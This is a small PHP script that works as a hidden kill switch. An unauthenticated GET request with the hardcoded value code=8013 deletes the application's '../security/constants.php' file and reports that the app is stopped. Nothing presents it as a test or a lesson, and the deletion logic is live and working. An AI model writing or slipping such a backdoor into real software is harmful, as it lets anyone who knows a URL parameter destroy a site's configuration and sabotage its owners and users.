<?php
if(isset($_GET['code'])){
$code = $_GET['code'];

if($code=="8013"){
 $status=unlink('../security/constants.php');    
 if($status){  
   echo "File deleted successfully! App Stoped!";    
 }else{
   echo "Sorry! Failed to delete!";    
 } 
}else{
  echo "Wrong code!"; 
}

}else{
    echo "Auth Error";
}
?>